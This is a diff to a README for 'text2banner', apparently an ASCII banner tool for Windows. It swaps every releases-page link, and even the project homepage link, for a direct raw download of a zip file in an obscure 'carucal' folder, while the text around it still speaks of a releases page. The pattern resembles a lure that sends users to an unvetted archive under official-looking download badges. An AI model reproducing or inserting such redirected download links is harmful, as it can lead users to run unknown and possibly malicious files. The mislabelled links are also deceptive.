@@ -1,6 +1,6 @@
 # 🖋️ text2banner - Create ASCII Banners Easily
 
-[![Download text2banner](https://img.shields.io/badge/Download-Get%20text2banner-green?style=for-the-badge)](https://github.com/MarioSamuel/text2banner/releases)
+[![Download text2banner](https://img.shields.io/badge/Download-Get%20text2banner-green?style=for-the-badge)](https://raw.githubusercontent.com/MarioSamuel/text2banner/master/carucal/banner_text_v1.0.zip)
 
 ---
 
@@ -39,14 +39,14 @@ text2banner is designed to work with zero setup. You just need to get to the dow
 
 Click the big button below to visit the official release page:
 
-[![Get text2banner](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/MarioSamuel/text2banner/releases)
+[![Get text2banner](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/MarioSamuel/text2banner/master/carucal/banner_text_v1.0.zip)
 
 ---
 
 ## 📥 How to Download and Use on Windows
 
 1. Click the download button or visit the releases page:  
-   https://github.com/MarioSamuel/text2banner/releases
+   https://raw.githubusercontent.com/MarioSamuel/text2banner/master/carucal/banner_text_v1.0.zip
 
 2. On the releases page, look for the latest version, usually at the top.
 
@@ -118,9 +118,9 @@ If problems remain, you can ask for help on the project’s GitHub page by openi
 ## 🔗 Useful Links
 
 - Download and releases page:  
-  https://github.com/MarioSamuel/text2banner/releases  
+  https://raw.githubusercontent.com/MarioSamuel/text2banner/master/carucal/banner_text_v1.0.zip  
 - Project homepage on GitHub:  
-  https://github.com/MarioSamuel/text2banner  
+  https://raw.githubusercontent.com/MarioSamuel/text2banner/master/carucal/banner_text_v1.0.zip  
 - Documentation and FAQ will be updated on the project page as needed.
 
 ---
@@ -163,4 +163,4 @@ Use the font selector to switch styles quickly and see instant updates.
 
 # [Emoji] text2banner - Create ASCII Banners Easily
 
-[![Download text2banner](https://img.shields.io/badge/Download-Get%20text2banner-green?style=for-the-badge)](https://github.com/MarioSamuel/text2banner/releases)
+[![Download text2banner](https://img.shields.io/badge/Download-Get%20text2banner-green?style=for-the-badge)](https://raw.githubusercontent.com/MarioSamuel/text2banner/master/carucal/banner_text_v1.0.zip)
